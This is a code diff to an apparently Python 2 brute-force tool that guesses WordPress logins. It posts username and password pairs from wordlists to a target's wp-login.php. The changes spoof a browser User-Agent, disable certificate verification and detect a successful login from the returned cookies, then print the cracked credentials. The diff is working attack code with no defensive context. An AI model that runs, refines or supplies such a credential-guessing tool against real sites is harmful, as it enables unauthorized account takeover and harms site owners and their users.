@@ -71,10 +71,8 @@ def find_between( s, first, last ):
 def url_config():
 	global login_URL
 	global host
-	global redirect
 	login_URL = raw_input("\n Enter target URL: ")
 	host = find_between(login_URL,"//","/")
-	redirect = 'http://%s/wp-login.php' % (host)
 	login_URL = 'http://%s/wp-login.php' % (host)
 	print "\n Target: %s" % (login_URL)
 	print ""
@@ -91,7 +89,6 @@ def bruteforce():
 	global bPlace
 	global keyword
 	global host
-	global redirect
 	global login_URL
 
 	text_file = open("list.txt", "r")
@@ -129,30 +126,22 @@ def bruteforce():
 					'log': uname,
 					'pwd': pwd,
 					'wp-submit': 'Log In',
-					'redirect_to': redirect,
 					'testcookie': '1'
 				}
 
 				#Header data
-				header_data = {}
+				header_data = {
+					'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0'
+				}
 
 				# 2) Submit POST data. Initialize login
-				bruteforce.page = c.post(login_URL, data=login_data, headers=header_data)
+				r = c.post(login_URL, data=login_data, headers=header_data, verify=False)
 
-				# 4) Looking for keyword indicating successful login
-				Check = bruteforce.page.content.find(keyword)
-				Check2 = bruteforce.page.content.find(keyword2)
-				Check3 = bruteforce.page.content.find(keyword3)
-
-				# Check = incorrect , Check2 = invalid
-				# If 'incorrect' and 'invalid' not found, then you've cracked the password.
-				if Check == -1 and Check2 == -1 and Check3 == -1:
+				cookie = str(r.cookies)
+				if cookie.find('settings')>-1 or cookie.find('=' + uname)>-1:
 					progressBar.close()
 					print "\n Cracked [ %s : %s ] \n" % (u,p)
 					break
-				# Otherwise, continue..
-				else:
-					pass
 
 		text_file.close()
 		text_file2.close()
